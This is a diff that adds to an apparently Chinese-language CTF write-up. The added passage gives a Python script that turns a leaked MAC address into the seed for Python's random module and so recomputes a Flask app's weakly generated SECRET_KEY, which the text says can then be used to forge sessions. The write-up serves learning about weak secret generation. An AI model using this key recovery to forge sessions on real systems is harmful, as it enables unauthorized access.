@@ -137,3 +137,29 @@ app.debug = True
 ![](assets/Day%203/file-20251220023000279.png)
 了解了一下，flask的session是会和`secret_key`有关的，有了这个key就可以用工具直接伪造了。
 这里我们直接按照逻辑得到`secret_key`
+我们通过脚本可以得到mac对应的key
+```python
+import random
+
+# 1. 在这里填入你获得的 MAC 地址
+# 格式可以是带冒号的 "02:42:ac:11:00:02" 也可以是纯十六进制 "0242ac110002"
+mac_address_str = "2e:b0:8f:54:a6:f4"
+
+# 2. 处理 MAC 地址格式：去掉冒号或横杠
+clean_mac = mac_address_str.replace(":", "").replace("-", "")
+
+# 3. 将十六进制字符串转换为十进制整数
+# uuid.getnode() 返回的就是这个十进制整数
+seed_value = int(clean_mac, 16)
+
+print(f"使用的 Seed (十进制): {seed_value}")
+
+# 4. 设置相同的种子
+random.seed(seed_value)
+
+# 5. 生成 Key
+# 这一步必须和服务器代码完全一致
+secret_key = str(random.random() * 233)
+
+print(f"计算出的 SECRET_KEY: {secret_key}")
+```
